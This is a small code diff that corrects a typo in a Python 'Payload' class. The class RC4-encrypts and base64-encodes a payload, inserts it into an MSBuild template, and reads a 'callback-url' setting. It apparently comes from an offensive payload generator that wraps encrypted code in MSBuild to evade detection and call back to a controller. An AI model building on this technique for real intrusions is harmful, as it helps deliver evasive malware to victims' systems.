@@ -71,7 +71,7 @@ class Payload:
         hex_rc4_key = RC4.format_rc4_key(rc4_key)
         rc4 = RC4(rc4_key)
         data = base64.b64encode(rc4.crypt(ps))
-        return msbuild.reaplace("[PAYLOAD]", data).replace("[KEY]", hex_rc4_key)
+        return msbuild.replace("[PAYLOAD]", data).replace("[KEY]", hex_rc4_key)
 
     def get_url(self):
         return self.config.get("callback-url")
